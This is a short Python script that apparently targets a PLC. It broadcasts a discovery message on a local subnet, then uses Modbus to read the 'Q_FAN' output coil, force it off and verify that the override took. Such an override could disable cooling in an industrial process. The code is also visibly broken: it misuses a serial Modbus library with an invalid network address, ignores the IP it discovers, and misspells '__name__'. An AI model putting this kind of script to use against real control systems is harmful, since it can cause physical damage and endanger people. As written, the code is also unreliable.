import socket
import struct
import time
import minimalmodbus

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet and the broadcast address
    subnet = '192.168.9.0'
    broadcast_address = '192.168.9.255'
    
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
    # Send a broadcast message to discover the PLC
    discovery_message = b'DISCOVER_PLC'
    sock.sendto(discovery_message, (broadcast_address, 502))
    
    # Set a timeout for receiving the response
    sock.settimeout(5)
    
    try:
        # Receive the response
        data, addr = sock.recvfrom(1024)
        if data == b'PLC_FOUND':
            return addr[0]
    except socket.timeout:
        print("No PLC found on the network.")
        return None

# Function to manipulate the I/O image of the PLC
def manipulate_io_image(plc_ip):
    # Configure the Modbus RTU settings
    instrument = minimalmodbus.Instrument(f'rs485://192.168.9.24:502', 1)
    instrument.serial.baudrate = 19200
    instrument.serial.bytesize = 8
    instrument.serial.parity = minimalmodbus.serial.PARITY_EVEN
    instrument.serial.stopbits = 1
    instrument.serial.timeout = 1
    
    # Address of the Q_FAN output in the I/O image
    q_fan_address = 0  # %Q0.0 is the first output, which corresponds to address 0 in Modbus
    
    # Read the current status of Q_FAN
    current_status = instrument.read_bit(q_fan_address, functioncode=1)
    print(f"Current status of Q_FAN: {current_status}")
    
    # Override the status of Q_FAN to 0 (off)
    instrument.write_bit(q_fan_address, 0, functioncode=5)
    print("Q_FAN has been overridden to 0 (off).")
    
    # Verify the override
    new_status = instrument.read_bit(q_fan_address, functioncode=1)
    print(f"New status of Q_FAN: {new_status}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Manipulate the I/O image
        manipulate_io_image(plc_ip)
    else:
        print("Failed to discover the PLC's IP address.")

if __name0 == "__main__":
    main()